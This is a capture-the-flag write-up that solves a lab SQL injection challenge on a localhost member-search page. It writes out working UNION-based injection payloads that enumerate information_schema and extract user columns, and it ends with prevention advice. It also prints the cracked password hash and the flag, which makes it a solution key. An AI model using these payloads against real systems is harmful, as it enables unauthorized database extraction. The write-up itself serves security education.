# SQL Injection

## Description

This challenge demonstrates a classic **SQL Injection (SQLi)** vulnerability. The web application takes user input from the member search feature and directly embeds it into a SQL query without sanitization or parameterization. This makes it possible to break the intended query structure, enumerate the database, and ultimately extract sensitive information.

## How to Get the Flag

* While testing the search feature on:

  ```
  http://localhost/index.php?page=member
  ```

  inserting a single quote (`'`) resulted in a database error, confirming the input was injected directly into the SQL query.

* To perform a UNION‑based SQL injection, the number of returned columns must match between the original query and the injected one. The **ORDER BY technique** helps identify the number of columns:

  ```
  1 ORDER BY 1
  1 ORDER BY 2
  1 ORDER BY 3
  ...
  ```

  When an error occurs at `N`, the query contains **N‑1 columns**.

* Assuming the original query looked like:

  ```sql
  SELECT last_name, first_name FROM users WHERE id={user_input}
  ```

* To learn how returned columns appear on the page:

  ```
  -1 UNION SELECT 1,2
  ```

  This reveals which column displays where in the interface.

* To explore the database, use `information_schema`, a built‑in metadata database.

### Get the table names of the current database

```sql
-1 UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema = DATABASE();
```

Only the `users` table was returned, meaning the original query pulls from this table.

### Get the column names of the table

`users` must be hex‑encoded to avoid errors:

```sql
-1 UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name = 0x7573657273 AND table_schema = DATABASE();
```

This reveals all columns, including two interesting ones: `commentaire` and `countersign`.

### Extract the values of those columns

```sql
-1 UNION SELECT first_name, commentaire FROM users
```

```sql
-1 UNION SELECT first_name, countersign FROM users
```

This exposes an MD5 hash:

```
5ff9d0165b4f92b14994e5c685cdce28
```

Using an online hash database such as CrackStation, the hash decrypts to:

```
FortyTwo
```

The comment hints to **lowercase** it → `fortytwo`.

Hashing it with SHA‑256:

```bash
echo -n "fortytwo" | shasum -a 256
```

Yields:

```
10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
```

This is the flag.

## Vulnerability Explanation

When user input is injected directly into a SQL query without sanitization or parameter binding, an attacker can alter the behavior of the query. This can allow access to other tables, metadata, or even full database extraction.

## Prevention of Vulnerability

* Use parameterized queries.
* Validate and sanitize all user inputs.
* Avoid exposing detailed SQL error messages.
* Apply least‑privilege principles to database users.
